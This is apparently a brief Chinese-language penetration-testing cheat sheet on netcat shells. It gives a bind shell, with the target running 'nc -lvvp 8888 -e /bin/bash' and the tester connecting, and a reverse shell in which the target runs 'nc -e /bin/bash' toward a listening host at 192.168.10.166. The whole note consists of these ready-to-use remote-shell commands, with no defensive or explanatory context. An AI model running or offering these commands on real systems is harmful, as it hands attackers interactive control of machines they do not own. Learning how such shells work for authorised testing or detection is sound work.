# webs

## 反弹shell

### nc

#### 正向

目标主机

```shell
nc -lvvp 8888 -e /bin/bash
```

测试主机

```shell
nc 192.168.10.1 8888
```

#### 反向

测试主机

```shell
nc -l 8888
```

目标主机

```shell
nc -e /bin/bash 192.168.10.166 8888
```
